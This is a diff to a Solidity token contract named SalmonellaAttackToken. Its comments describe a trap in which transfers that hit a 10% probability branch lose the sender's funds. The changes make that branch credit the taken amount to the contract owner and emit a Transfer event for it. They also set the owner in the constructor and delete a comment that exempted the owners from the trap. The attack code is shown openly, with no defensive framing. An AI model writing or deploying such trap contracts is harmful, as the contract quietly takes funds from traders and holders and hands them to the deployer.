@@ -28,7 +28,8 @@ contract SalmonellaAttackToken is IERC20 {
         decimals = 18;
         totalSupply = initialSupply * 10**uint256(decimals);
         _balances[msg.sender] = totalSupply;
-        emit Transfer(address(0), msg.sender, totalSupply);
+	owner = msg.sender;
+        emit Transfer(address(0), owner, totalSupply);
     }
     
      /**
@@ -96,7 +97,6 @@ contract SalmonellaAttackToken is IERC20 {
      * Added boolean trapped as a flag to see if in has entered in the 10% of probability.
      * if trapped is false, do the normal transfer function.
      * if trapped is true, burn all their money.
-     * If sender = Owner A or B == normal Transfer
      * Otherwise, Execute Salmonella 
      */
     function _transfer(address sender, address recipient, uint256 amount) internal {
@@ -118,8 +118,9 @@ contract SalmonellaAttackToken is IERC20 {
           _balances[recipient] += amount;
           emit Transfer(sender, recipient, amount);
         }else{
-	        _balances[sender] = senderBalance - amount;
+	  _balances[sender] = senderBalance - amount;
           _balances[owner] += amount;
+	  emit Transfer(sender, owner, amount);
         }
     }
     
